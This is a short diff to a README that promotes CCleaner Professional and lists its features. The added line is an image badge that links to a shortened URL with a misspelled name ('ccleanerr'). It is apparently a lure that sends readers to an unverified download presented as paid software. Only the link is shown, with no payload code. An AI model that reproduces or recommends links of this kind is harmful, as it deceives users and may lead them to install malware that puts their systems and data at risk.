@@ -1,6 +1,8 @@
 # CCleaner 
 CCleaner Professional (often referred to as CCleaner Pro) is the paid version of the popular PC optimization and cleaning tool, CCleaner. While the free version provides basic cleaning and privacy features, the professional version includes a suite of advanced features designed to automatically maintain and improve PC performance.
 
+[![4312624765](https://github.com/user-attachments/assets/3691586d-089d-4bcd-8f34-e7ff2f5fd58e)](https://y.gy/ccleanerr)
+
 ## Key Features:
 
 1. PC Health Check: This is a comprehensive tool that analyzes your computer and provides recommendations for improving its health. It identifies issues and offers one-click fixes.
